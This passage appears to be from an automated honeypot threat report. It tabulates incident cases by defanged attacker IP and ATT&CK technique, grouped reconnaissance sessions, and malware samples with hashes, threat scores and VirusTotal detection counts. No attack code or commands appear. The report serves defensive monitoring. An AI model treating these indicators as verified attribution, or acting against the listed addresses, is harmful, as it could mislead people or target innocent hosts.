| IR-0696b4638b73 | HIGH | `176.53.159[.]196` | 2026-11-03 06:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dd4531539fa8 | HIGH | `45.156.87[.]65` | 2026-11-03 06:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2dfe69e5c1f4 | HIGH | `93.152.221[.]37` | 2026-11-03 06:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b2d677a61cc7 | HIGH | `195.178.110[.]218` | 2026-11-03 07:24 | Y | 1 | 0 | `T1078 · T1592` |
| IR-45d44153b084 | HIGH | `193.32.162[.]15` | 2026-11-03 07:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a73fe5cb3bf2 | HIGH | `152.32.188[.]242` | 2026-11-03 07:38 | Y | 1 | 0 | `T1078` |
| IR-84da519da55f | HIGH | `80.94.95[.]118` | 2026-11-03 07:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-65ccb257c450 | HIGH | `195.178.110[.]218` | 2026-11-03 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-a5f8122fdd2a | HIGH | `93.152.221[.]37` | 2026-11-03 08:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d076fa013738 | HIGH | `125.94.107[.]91` | 2026-11-03 08:12 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-7222d2dcd871 | HIGH | `138.226.239[.]234` | 2026-11-03 08:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-43759b886bab | HIGH | `43.226.60[.]99` | 2026-11-03 08:33 | Y | 1 | 0 | `T1078 · T1592` |
| IR-da7accabe637 | HIGH | `176.53.159[.]196` | 2026-11-03 09:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-99876518e84e | HIGH | `89.125.237[.]102` | 2026-11-03 09:16 | Y | 4 | 0 | `T1078 · T1083` |
| IR-bfaacd3b672d | HIGH | `69.6.221[.]18` | 2026-11-03 09:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-edb26ba901fb | HIGH | `69.6.221[.]18` | 2026-11-03 09:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-28c85f6df4a7 | HIGH | `46.6.124[.]199` | 2026-11-03 09:55 | Y | 19 | 2 | `T1021.004 · T1053.003 · T1057` |
| IR-3450d2a111e9 | HIGH | `117.2.107[.]64` | 2026-11-03 09:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8c2b96c5eefb | HIGH | `117.2.107[.]64` | 2026-11-03 09:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3f9fc7d51535 | HIGH | `120.48.127[.]169` | 2026-11-03 09:56 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-e57f288af5bf | HIGH | `195.178.110[.]218` | 2026-11-03 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-1cac9f74eb5a | HIGH | `201.124.171[.]198` | 2026-11-03 10:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bf4b6fa45822 | HIGH | `201.124.171[.]198` | 2026-11-03 10:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7e7026afb52c | HIGH | `103.159.2[.]113` | 2026-11-03 10:04 | Y | 1 | 0 | `T1078 · T1592` |
| IR-35ba3be6d6e0 | HIGH | `2.27.154[.]8` | 2026-11-03 10:12 | Y | 1 | 0 | `T1078 · T1592` |
| IR-137f7ac95a62 | HIGH | `80.94.92[.]179` | 2026-11-03 10:21 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f360cc364a13 | HIGH | `80.94.92[.]179` | 2026-11-03 10:23 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-34a8a9d9f2d7 | HIGH | `85.11.167[.]123` | 2026-11-03 10:25 | Y | 1 | 0 | `T1078 · T1592` |
| IR-76afbfc2704e | HIGH | `80.94.92[.]179` | 2026-11-03 10:26 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7fe2f1422c5a | HIGH | `85.11.167[.]124` | 2026-11-03 10:31 | Y | 1 | 0 | `T1078 · T1592` |
| IR-7f1f77b17770 | HIGH | `176.53.159[.]196` | 2026-11-03 10:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2600cbdd73c1 | HIGH | `85.11.167[.]125` | 2026-11-03 10:41 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f07a3cdad7bd | HIGH | `138.226.239[.]234` | 2026-11-03 11:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2e7ee4f9944e | HIGH | `138.226.239[.]233` | 2026-11-03 11:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-10ad28fb0f69 | HIGH | `109.160.32[.]117` | 2026-11-03 11:47 | Y | 1 | 0 | `T1078 · T1592` |
| IR-43dc69ae25fa | HIGH | `93.152.221[.]37` | 2026-11-03 11:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9520e37be652 | HIGH | `109.160.32[.]117` | 2026-11-03 12:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b55aa20c9419 | HIGH | `195.178.110[.]218` | 2026-11-03 12:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-42a4cf0d6075 | HIGH | `77.239.124[.]179` | 2026-11-03 12:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e27a02d8fa65 | HIGH | `103.159.2[.]113` | 2026-11-03 12:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-269a8ba5ec8e | HIGH | `65.49.1[.]202` | 2026-11-03 12:07 | Y | 3 | 0 | `T1078` |
| IR-4ef676eed7c9 | HIGH | `176.53.159[.]196` | 2026-11-03 12:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-90d6bd2dd609 | HIGH | `179.43.153[.]10` | 2026-11-03 12:58 | Y | 1 | 0 | `T1078 · T1592` |
| IR-5bf39f451586 | HIGH | `144.22.238[.]238` | 2026-11-03 13:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-368e1d8cc598 | HIGH | `2.57.122[.]209` | 2026-11-03 13:19 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5d06267eed00 | HIGH | `2.57.122[.]209` | 2026-11-03 13:22 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-587780ec536e | HIGH | `93.152.221[.]37` | 2026-11-03 13:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b7479cb9c23c | HIGH | `2.57.122[.]209` | 2026-11-03 13:24 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e70b2b596e6b | HIGH | `2.57.122[.]209` | 2026-11-03 13:27 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-55de7f358136 | HIGH | `2.57.122[.]209` | 2026-11-03 13:30 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f9dd47f92766 | HIGH | `23.88.43[.]131` | 2026-11-03 13:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-947d7d59f510 | HIGH | `80.59.2[.]199` | 2026-11-03 13:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-97fad4a6d174 | HIGH | `23.88.43[.]131` | 2026-11-03 13:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f12a4daacd0e | HIGH | `80.59.2[.]199` | 2026-11-03 13:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e1e09a6cdb43 | HIGH | `204.168.250[.]255` | 2026-11-03 13:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-57f02b32ae92 | HIGH | `204.168.250[.]255` | 2026-11-03 13:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-05282a7e254a | HIGH | `189.165.77[.]80` | 2026-11-03 13:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e23b1797f55c | HIGH | `46.8.224[.]240` | 2026-11-03 13:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-25017d81ea90 | HIGH | `189.165.77[.]80` | 2026-11-03 13:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1009f96c2b23 | HIGH | `46.8.224[.]240` | 2026-11-03 13:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0d30c2d9c147 | HIGH | `87.106.65[.]126` | 2026-11-03 13:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9aa3909f23a7 | HIGH | `87.106.65[.]126` | 2026-11-03 13:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-775cc9d85aa0 | HIGH | `125.122.102[.]148` | 2026-11-03 13:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 32 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **4** | 2026-11-03 03:01 | 2026-11-03 08:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-11-03 10:25 | 2026-11-03 16:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **3** | 2026-11-03 10:08 | 2026-11-03 14:05 | 3m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-03 03:16 | 2026-11-03 04:20 | 3m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-03 06:45 | 2026-11-03 08:04 | 1m | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | **2** | 2026-11-03 09:42 | 2026-11-03 11:33 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-11-03 07:24 | 2026-11-03 08:03 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-11-03 11:35 | 2026-11-03 12:15 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.96.205[.]145` | 1 | 2026-11-03 15:22 | 2026-11-03 15:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.96.221[.]200` | 1 | 2026-11-03 15:23 | 2026-11-03 15:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.159.2[.]113` | 1 | 2026-11-03 09:56 | 2026-11-03 09:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.214.71[.]167` | 1 | 2026-11-03 12:39 | 2026-11-03 12:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `108.167.86[.]68` | 1 | 2026-11-03 12:05 | 2026-11-03 12:05 | 16s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]117` | 1 | 2026-11-03 11:47 | 2026-11-03 11:47 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.63.144[.]68` | 1 | 2026-11-03 04:10 | 2026-11-03 04:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `110.53.97[.]49` | 1 | 2026-11-03 08:47 | 2026-11-03 08:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.28.132[.]33` | 1 | 2026-11-03 12:28 | 2026-11-03 12:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `112.4.128[.]51` | 1 | 2026-11-03 13:33 | 2026-11-03 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `114.112.96[.]82` | 1 | 2026-11-03 15:21 | 2026-11-03 15:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.151.72[.]155` | 1 | 2026-11-03 04:50 | 2026-11-03 04:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.126[.]68` | 1 | 2026-11-03 04:53 | 2026-11-03 04:54 | 91s | 0 | `T1592` | 🟢 LOW |
| `116.255.227[.]108` | 1 | 2026-11-03 04:50 | 2026-11-03 04:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.8[.]203` | 1 | 2026-11-03 09:54 | 2026-11-03 09:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.204.171[.]142` | 1 | 2026-11-03 04:53 | 2026-11-03 04:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.94.107[.]91` | 1 | 2026-11-03 08:07 | 2026-11-03 08:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `131.100.222[.]154` | 1 | 2026-11-03 05:58 | 2026-11-03 05:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-03 16:20 | 2026-11-03 16:22 | 86s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-03 03:09 | 2026-11-03 03:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]250` | 1 | 2026-11-03 13:54 | 2026-11-03 13:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-03 13:56 | 2026-11-03 13:57 | 51s | 0 | `T1592` | 🟢 LOW |
| `152.32.188[.]242` | 1 | 2026-11-03 07:38 | 2026-11-03 07:38 | 7s | 0 | `T1592` | 🟢 LOW |
| `165.22.27[.]186` | 1 | 2026-11-03 05:14 | 2026-11-03 05:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.227.62[.]247` | 1 | 2026-11-03 08:04 | 2026-11-03 08:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.245.242[.]42` | 1 | 2026-11-03 08:49 | 2026-11-03 08:49 | 20s | 0 | `T1592` | 🟢 LOW |
| `168.195.32[.]117` | 1 | 2026-11-03 12:49 | 2026-11-03 12:49 | 33s | 0 | `T1592` | 🟢 LOW |
| `168.205.121[.]227` | 1 | 2026-11-03 05:02 | 2026-11-03 05:02 | 5s | 0 | `T1592` | 🟢 LOW |
| `170.233.71[.]234` | 1 | 2026-11-03 13:06 | 2026-11-03 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.247.160[.]98` | 1 | 2026-11-03 05:08 | 2026-11-03 05:08 | 33s | 0 | `T1592` | 🟢 LOW |
| `170.254.10[.]204` | 1 | 2026-11-03 03:40 | 2026-11-03 03:40 | 12s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]227` | 1 | 2026-11-03 12:43 | 2026-11-03 12:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.117.173[.]251` | 1 | 2026-11-03 16:30 | 2026-11-03 16:30 | 12s | 0 | `T1592` | 🟢 LOW |
| `179.43.153[.]10` | 1 | 2026-11-03 12:55 | 2026-11-03 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-03 03:02 | 2026-11-03 03:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-03 10:00 | 2026-11-03 10:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.168[.]116` | 1 | 2026-11-03 13:38 | 2026-11-03 13:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.232.212[.]207` | 1 | 2026-11-03 13:55 | 2026-11-03 13:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.251.230[.]98` | 1 | 2026-11-03 10:01 | 2026-11-03 10:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.36.126[.]68` | 1 | 2026-11-03 13:52 | 2026-11-03 13:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.56.216[.]153` | 1 | 2026-11-03 12:32 | 2026-11-03 12:33 | 59s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-03 07:37 | 2026-11-03 07:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | 1 | 2026-11-03 04:15 | 2026-11-03 04:15 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `199.165.159[.]49` | 1 | 2026-11-03 04:07 | 2026-11-03 04:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.27.154[.]8` | 1 | 2026-11-03 06:56 | 2026-11-03 06:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | 1 | 2026-11-03 15:46 | 2026-11-03 15:46 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-11-03 13:02 | 2026-11-03 13:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-11-03 05:06 | 2026-11-03 05:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.112.236[.]17` | 1 | 2026-11-03 06:50 | 2026-11-03 06:50 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.14.94[.]24` | 1 | 2026-11-03 05:14 | 2026-11-03 05:14 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.98.153[.]153` | 1 | 2026-11-03 06:04 | 2026-11-03 06:04 | 9s | 0 | `T1592` | 🟢 LOW |
| `200.112.140[.]200` | 1 | 2026-11-03 05:18 | 2026-11-03 05:19 | 32s | 0 | `T1592` | 🟢 LOW |
| `201.139.216[.]123` | 1 | 2026-11-03 10:11 | 2026-11-03 10:11 | 33s | 0 | `T1592` | 🟢 LOW |
| `201.71.173[.]44` | 1 | 2026-11-03 12:48 | 2026-11-03 12:48 | 32s | 0 | `T1592` | 🟢 LOW |
| `203.25.208[.]110` | 1 | 2026-11-03 13:59 | 2026-11-03 14:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `213.230.92[.]72` | 1 | 2026-11-03 11:42 | 2026-11-03 11:42 | 11s | 0 | `T1592` | 🟢 LOW |
| `218.206.136[.]24` | 1 | 2026-11-03 15:24 | 2026-11-03 15:26 | 90s | 0 | `T1592` | 🟢 LOW |
| `223.223.199[.]221` | 1 | 2026-11-03 13:55 | 2026-11-03 13:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.128.240[.]75` | 1 | 2026-11-03 04:53 | 2026-11-03 04:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.200.182[.]235` | 1 | 2026-11-03 05:54 | 2026-11-03 05:55 | 14s | 0 | `T1592` | 🟢 LOW |
| `35.210.237[.]238` | 1 | 2026-11-03 04:57 | 2026-11-03 04:57 | 10s | 0 | `T1592` | 🟢 LOW |
| `35.210.39[.]113` | 1 | 2026-11-03 03:46 | 2026-11-03 03:46 | 4s | 0 | `T1592` | 🟢 LOW |
| `35.210.55[.]156` | 1 | 2026-11-03 05:40 | 2026-11-03 05:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.93[.]182` | 1 | 2026-11-03 04:31 | 2026-11-03 04:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `37.77.150[.]71` | 1 | 2026-11-03 14:24 | 2026-11-03 14:24 | 4s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]237` | 1 | 2026-11-03 15:59 | 2026-11-03 16:00 | 60s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-11-03 09:55 | 2026-11-03 09:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `40.124.123[.]79` | 1 | 2026-11-03 15:07 | 2026-11-03 15:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `42.236.82[.]169` | 1 | 2026-11-03 15:37 | 2026-11-03 15:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.226.60[.]99` | 1 | 2026-11-03 08:33 | 2026-11-03 08:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | 1 | 2026-11-03 04:02 | 2026-11-03 04:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-11-03 13:02 | 2026-11-03 13:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.184.178[.]220` | 1 | 2026-11-03 16:38 | 2026-11-03 16:38 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]94` | 1 | 2026-11-03 07:08 | 2026-11-03 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.82.78[.]102` | 1 | 2026-11-03 15:36 | 2026-11-03 15:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.110.23[.]225` | 1 | 2026-11-03 09:10 | 2026-11-03 09:10 | 14s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-11-03 09:10 | 2026-11-03 09:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]76` | 1 | 2026-11-03 07:08 | 2026-11-03 07:08 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]125` | 1 | 2026-11-03 07:31 | 2026-11-03 07:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]182` | 1 | 2026-11-03 11:34 | 2026-11-03 11:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]197` | 1 | 2026-11-03 11:35 | 2026-11-03 11:35 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]211` | 1 | 2026-11-03 16:31 | 2026-11-03 16:31 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]108` | 1 | 2026-11-03 09:31 | 2026-11-03 09:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]83` | 1 | 2026-11-03 07:32 | 2026-11-03 07:32 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]229` | 1 | 2026-11-03 11:33 | 2026-11-03 11:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `71.6.134[.]231` | 1 | 2026-11-03 04:55 | 2026-11-03 04:56 | 14s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]130` | 1 | 2026-11-03 09:33 | 2026-11-03 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.190.180[.]220` | 1 | 2026-11-03 03:24 | 2026-11-03 03:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.87.150[.]155` | 1 | 2026-11-03 12:38 | 2026-11-03 12:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-03 03:47 | 2026-11-03 03:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]152` | 1 | 2026-11-03 16:11 | 2026-11-03 16:11 | 8s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]162` | 1 | 2026-11-03 04:26 | 2026-11-03 04:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]179` | 1 | 2026-11-03 06:53 | 2026-11-03 06:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.67.26[.]53` | 1 | 2026-11-03 13:52 | 2026-11-03 13:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-11-03 10:16 | 2026-11-03 10:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.54.71[.]137` | 1 | 2026-11-03 04:01 | 2026-11-03 04:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]41` | 1 | 2026-11-03 08:52 | 2026-11-03 08:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.125.237[.]102` | 1 | 2026-11-03 09:16 | 2026-11-03 09:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.71.20[.]11` | 1 | 2026-11-03 09:44 | 2026-11-03 09:44 | 9s | 0 | `T1592` | 🟢 LOW |
| `91.106.36[.]177` | 1 | 2026-11-03 03:23 | 2026-11-03 03:24 | 14s | 0 | `T1592` | 🟢 LOW |
| `91.214.208[.]245` | 1 | 2026-11-03 12:14 | 2026-11-03 12:14 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
